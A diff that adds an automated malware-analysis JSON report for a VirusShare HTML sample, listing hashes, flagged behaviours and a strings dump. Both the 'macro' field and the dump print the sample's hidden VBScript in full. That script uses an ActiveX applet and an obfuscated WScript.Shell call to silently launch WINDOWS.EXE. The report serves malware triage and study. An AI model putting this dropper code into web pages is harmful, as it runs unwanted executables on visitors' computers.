@@ -1,0 +1,64 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
+            "WINDOWS": "May enumerate application windows",
+            "run": "May run an executable file or a system command",
+            "write": "May write to a file"
+        },
+        "macro": "<html>\n<head>\n<meta http-equiv=\"content-type\" content=\"text/html; charset=UTF-8\">\n</head>\n<body style=\"margin: 0\" scroll=no>\n<object id=FileList border=0 tabindex=1\nclassid = \"clsid:1820FED0-473E-11D0-A96C-00C04FD705A2\"\nstyle=\"width: 100%; height: 100%\" tabIndex=-1>\n</object>\n</body>\n</html>\n<script language=vbscript>\ndocument.write \"<div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'><APPLET NAME=L HEIGHT=0 WIDTH=0 code=com.ms.activeX.ActiveXComponent></APPLET></div>\"\n</script>\n<script language=vbscript>\nOn Error Resume Next\nDim path\nPath = \"\"\nPath = Left(document.location, Len(document.location) - 11)\nPath = Mid(Path, 9)+\"/\"\nSet AppleObject = document.applets(\"l\")\nAppleObject.setCLSID (\"{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}\")\nAppleObject.createInstance()\nsd=\"w\"+\"sshe\"+\"ll\"\nSet sd = AppleObject.GetObject()\nsd.run(Path + \"WINDOWS.EXE\")\n</script>"
+    },
+    "filename": "VirusShare_2f7c413944f4bd9b7bd1c8461de9ed37",
+    "filesize": 937,
+    "filetype": "HTML document, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "2f7c413944f4bd9b7bd1c8461de9ed37",
+        "sha1": "66c39157622273c0014fd3e78d7fe864a6db0c47",
+        "sha256": "5a007c9d68fd99abd637dd273ce01bb682461138a07597426c41bf08a3b23de3"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "<html>",
+            "<head>",
+            "<meta http-equiv=\"content-type\" content=\"text/html; charset=UTF-8\">",
+            "</head>",
+            "<body style=\"margin: 0\" scroll=no>",
+            "<object id=FileList border=0 tabindex=1",
+            "classid = \"clsid:1820FED0-473E-11D0-A96C-00C04FD705A2\"",
+            "style=\"width: 100%; height: 100%\" tabIndex=-1>",
+            "</object>",
+            "</body>",
+            "</html>",
+            "<script language=vbscript>",
+            "document.write \"<div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'><APPLET NAME=L HEIGHT=0 WIDTH=0 code=com.ms.activeX.ActiveXComponent></APPLET></div>\"",
+            "</script>",
+            "<script language=vbscript>",
+            "On Error Resume Next",
+            "Dim path",
+            "Path = \"\"",
+            "Path = Left(document.location, Len(document.location) - 11)",
+            "Path = Mid(Path, 9)+\"/\"",
+            "Set AppleObject = document.applets(\"l\")",
+            "AppleObject.setCLSID (\"{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}\")",
+            "AppleObject.createInstance()",
+            "sd=\"w\"+\"sshe\"+\"ll\"",
+            "Set sd = AppleObject.GetObject()",
+            "sd.run(Path + \"WINDOWS.EXE\")",
+            "</script>"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.266843",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
